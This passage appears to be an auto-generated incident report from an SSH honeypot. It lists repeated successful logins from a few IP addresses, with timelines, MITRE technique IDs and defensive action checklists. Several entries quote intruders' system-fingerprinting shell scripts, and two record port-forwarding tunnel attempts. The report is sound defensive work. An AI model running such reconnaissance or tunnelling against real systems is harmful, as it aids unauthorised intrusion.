|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:10 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:10:58` | `cowrie.session.connect` |
| `2026-07-21 04:10:58` | `cowrie.client.version` |
| `2026-07-21 04:10:58` | `cowrie.client.kex` |
| `2026-07-21 04:10:59` | `cowrie.login.success` |
| `2026-07-21 04:11:00` | `cowrie.session.params` |
| `2026-07-21 04:11:00` | `cowrie.command.input` |
| `2026-07-21 04:11:00` | `cowrie.log.closed` |
| `2026-07-21 04:11:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28b2b71d4494

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:03` | `cowrie.session.connect` |
| `2026-07-21 04:11:03` | `cowrie.client.version` |
| `2026-07-21 04:11:04` | `cowrie.client.kex` |
| `2026-07-21 04:11:04` | `cowrie.login.success` |
| `2026-07-21 04:11:05` | `cowrie.session.params` |
| `2026-07-21 04:11:05` | `cowrie.command.input` |
| `2026-07-21 04:11:05` | `cowrie.log.closed` |
| `2026-07-21 04:11:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-abc286887c5a

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:08` | `cowrie.session.connect` |
| `2026-07-21 04:11:08` | `cowrie.client.version` |
| `2026-07-21 04:11:08` | `cowrie.client.kex` |
| `2026-07-21 04:11:09` | `cowrie.login.success` |
| `2026-07-21 04:11:10` | `cowrie.session.params` |
| `2026-07-21 04:11:10` | `cowrie.command.input` |
| `2026-07-21 04:11:10` | `cowrie.log.closed` |
| `2026-07-21 04:11:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-507abb4d27df

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:13` | `cowrie.session.connect` |
| `2026-07-21 04:11:13` | `cowrie.client.version` |
| `2026-07-21 04:11:13` | `cowrie.client.kex` |
| `2026-07-21 04:11:14` | `cowrie.login.success` |
| `2026-07-21 04:11:14` | `cowrie.session.params` |
| `2026-07-21 04:11:14` | `cowrie.command.input` |
| `2026-07-21 04:11:15` | `cowrie.log.closed` |
| `2026-07-21 04:11:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f2c7d74a25b0

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:18` | `cowrie.session.connect` |
| `2026-07-21 04:11:18` | `cowrie.client.version` |
| `2026-07-21 04:11:18` | `cowrie.client.kex` |
| `2026-07-21 04:11:19` | `cowrie.login.success` |
| `2026-07-21 04:11:19` | `cowrie.session.params` |
| `2026-07-21 04:11:19` | `cowrie.command.input` |
| `2026-07-21 04:11:19` | `cowrie.log.closed` |
| `2026-07-21 04:11:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aeac0ba0b7c5

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:23` | `cowrie.session.connect` |
| `2026-07-21 04:11:23` | `cowrie.client.version` |
| `2026-07-21 04:11:23` | `cowrie.client.kex` |
| `2026-07-21 04:11:23` | `cowrie.login.success` |
| `2026-07-21 04:11:24` | `cowrie.session.params` |
| `2026-07-21 04:11:24` | `cowrie.command.input` |
| `2026-07-21 04:11:24` | `cowrie.log.closed` |
| `2026-07-21 04:11:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be5b59b4c65c

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:28` | `cowrie.session.connect` |
| `2026-07-21 04:11:28` | `cowrie.client.version` |
| `2026-07-21 04:11:28` | `cowrie.client.kex` |
| `2026-07-21 04:11:29` | `cowrie.login.success` |
| `2026-07-21 04:11:29` | `cowrie.session.params` |
| `2026-07-21 04:11:29` | `cowrie.command.input` |
| `2026-07-21 04:11:30` | `cowrie.log.closed` |
| `2026-07-21 04:11:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dd7a96d8e026

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:33` | `cowrie.session.connect` |
| `2026-07-21 04:11:33` | `cowrie.client.version` |
| `2026-07-21 04:11:33` | `cowrie.client.kex` |
| `2026-07-21 04:11:33` | `cowrie.login.success` |
| `2026-07-21 04:11:34` | `cowrie.session.params` |
| `2026-07-21 04:11:34` | `cowrie.command.input` |
| `2026-07-21 04:11:34` | `cowrie.log.closed` |
| `2026-07-21 04:11:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2bee09c66bbf

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:38` | `cowrie.session.connect` |
| `2026-07-21 04:11:38` | `cowrie.client.version` |
| `2026-07-21 04:11:38` | `cowrie.client.kex` |
| `2026-07-21 04:11:39` | `cowrie.login.success` |
| `2026-07-21 04:11:39` | `cowrie.session.params` |
| `2026-07-21 04:11:39` | `cowrie.command.input` |
| `2026-07-21 04:11:40` | `cowrie.log.closed` |
| `2026-07-21 04:11:40` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cbcc3612540

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:43` | `cowrie.session.connect` |
| `2026-07-21 04:11:43` | `cowrie.client.version` |
| `2026-07-21 04:11:43` | `cowrie.client.kex` |
| `2026-07-21 04:11:43` | `cowrie.login.success` |
| `2026-07-21 04:11:44` | `cowrie.session.params` |
| `2026-07-21 04:11:44` | `cowrie.command.input` |
| `2026-07-21 04:11:44` | `cowrie.log.closed` |
| `2026-07-21 04:11:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-20908d102ba1

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:48` | `cowrie.session.connect` |
| `2026-07-21 04:11:48` | `cowrie.client.version` |
| `2026-07-21 04:11:48` | `cowrie.client.kex` |
| `2026-07-21 04:11:49` | `cowrie.login.success` |
| `2026-07-21 04:11:50` | `cowrie.session.params` |
| `2026-07-21 04:11:50` | `cowrie.command.input` |
| `2026-07-21 04:11:50` | `cowrie.log.closed` |
| `2026-07-21 04:11:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ea0cf0116613

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:53` | `cowrie.session.connect` |
| `2026-07-21 04:11:53` | `cowrie.client.version` |
| `2026-07-21 04:11:53` | `cowrie.client.kex` |
| `2026-07-21 04:11:53` | `cowrie.login.success` |
| `2026-07-21 04:11:54` | `cowrie.session.params` |
| `2026-07-21 04:11:54` | `cowrie.command.input` |
| `2026-07-21 04:11:54` | `cowrie.log.closed` |
| `2026-07-21 04:11:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0388b0286d6e

| Field | Detail |
|---|---|
| **Source IP** | `91.92.42[.]36` |
| **First Seen** | 2026-07-21 04:11 |
| **Last Seen** | 2026-07-21 04:11 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -v -n -r -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:11:58` | `cowrie.session.connect` |
| `2026-07-21 04:11:58` | `cowrie.client.version` |
| `2026-07-21 04:11:58` | `cowrie.client.kex` |
| `2026-07-21 04:11:58` | `cowrie.login.success` |
| `2026-07-21 04:11:59` | `cowrie.session.params` |
| `2026-07-21 04:11:59` | `cowrie.command.input` |
| `2026-07-21 04:11:59` | `cowrie.log.closed` |
| `2026-07-21 04:11:59` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `91.92.42[.]36` to AbuseIPDB if not already reported
- [ ] Block `91.92.42[.]36` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-367731efceb8

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:12 |
| **Last Seen** | 2026-07-21 04:12 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:12:07` | `cowrie.session.connect` |
| `2026-07-21 04:12:07` | `cowrie.client.version` |
| `2026-07-21 04:12:07` | `cowrie.client.kex` |
| `2026-07-21 04:12:09` | `cowrie.login.success` |
| `2026-07-21 04:12:11` | `cowrie.session.params` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.success` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:11` | `cowrie.command.input` |
| `2026-07-21 04:12:12` | `cowrie.log.closed` |
| `2026-07-21 04:12:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8a40c25abef2

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:14 |
| **Last Seen** | 2026-07-21 04:14 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:14:03` | `cowrie.session.connect` |
| `2026-07-21 04:14:04` | `cowrie.client.version` |
| `2026-07-21 04:14:04` | `cowrie.client.kex` |
| `2026-07-21 04:14:06` | `cowrie.login.success` |
| `2026-07-21 04:14:08` | `cowrie.session.params` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.success` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.command.input` |
| `2026-07-21 04:14:08` | `cowrie.log.closed` |
| `2026-07-21 04:14:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-969fec564ff0

| Field | Detail |
|---|---|
| **Source IP** | `58.34.174[.]90` |
| **First Seen** | 2026-07-21 04:14 |
| **Last Seen** | 2026-07-21 04:14 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:14:04` | `cowrie.session.connect` |
| `2026-07-21 04:14:04` | `cowrie.client.version` |
| `2026-07-21 04:14:04` | `cowrie.client.kex` |
| `2026-07-21 04:14:08` | `cowrie.login.success` |
| `2026-07-21 04:14:10` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:14:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `58.34.174[.]90` to AbuseIPDB if not already reported
- [ ] Block `58.34.174[.]90` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b33e5b2d6cb8

| Field | Detail |
|---|---|
| **Source IP** | `66.45.144[.]201` |
| **First Seen** | 2026-07-21 04:14 |
| **Last Seen** | 2026-07-21 04:14 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:14:17` | `cowrie.session.connect` |
| `2026-07-21 04:14:17` | `cowrie.client.version` |
| `2026-07-21 04:14:17` | `cowrie.client.kex` |
| `2026-07-21 04:14:18` | `cowrie.login.success` |
| `2026-07-21 04:14:19` | `cowrie.direct-tcpip.request` |
| `2026-07-21 04:14:23` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `66.45.144[.]201` to AbuseIPDB if not already reported
- [ ] Block `66.45.144[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-40f3ffedfb88

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:16 |
| **Last Seen** | 2026-07-21 04:16 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:16:01` | `cowrie.session.connect` |
| `2026-07-21 04:16:01` | `cowrie.client.version` |
| `2026-07-21 04:16:01` | `cowrie.client.kex` |
| `2026-07-21 04:16:03` | `cowrie.login.success` |
| `2026-07-21 04:16:04` | `cowrie.session.params` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.success` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:04` | `cowrie.command.input` |
| `2026-07-21 04:16:05` | `cowrie.log.closed` |
| `2026-07-21 04:16:05` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0e1d7dcfffba

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:17 |
| **Last Seen** | 2026-07-21 04:18 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:17:56` | `cowrie.session.connect` |
| `2026-07-21 04:17:57` | `cowrie.client.version` |
| `2026-07-21 04:17:57` | `cowrie.client.kex` |
| `2026-07-21 04:17:59` | `cowrie.login.success` |
| `2026-07-21 04:18:01` | `cowrie.session.params` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.success` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.command.input` |
| `2026-07-21 04:18:01` | `cowrie.log.closed` |
| `2026-07-21 04:18:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-baf453d5df72

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
| **First Seen** | 2026-07-21 04:19 |
| **Last Seen** | 2026-07-21 04:20 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-21 04:19:57` | `cowrie.session.connect` |
| `2026-07-21 04:19:57` | `cowrie.client.version` |
| `2026-07-21 04:19:57` | `cowrie.client.kex` |
| `2026-07-21 04:19:58` | `cowrie.login.success` |
| `2026-07-21 04:19:59` | `cowrie.session.params` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.success` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:19:59` | `cowrie.command.input` |
| `2026-07-21 04:20:00` | `cowrie.log.closed` |
| `2026-07-21 04:20:00` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `92.118.39[.]14` to AbuseIPDB if not already reported
- [ ] Block `92.118.39[.]14` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-94b946763dda

| Field | Detail |
|---|---|
| **Source IP** | `92.118.39[.]14` |
